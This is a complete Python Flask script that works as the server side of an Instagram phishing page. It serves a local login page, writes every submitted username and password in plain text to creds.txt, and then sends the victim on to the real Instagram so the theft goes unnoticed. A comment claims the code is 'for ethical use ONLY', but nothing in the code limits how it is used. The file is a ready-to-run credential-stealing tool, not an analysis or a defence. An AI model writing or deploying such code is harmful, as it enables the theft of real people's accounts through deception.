from flask import Flask, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return open("index.html").read()

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Save to a file locally — for ethical use ONLY
    with open("creds.txt", "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")

    # Redirect to the real Instagram
    return redirect("https://instagram.com")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000)
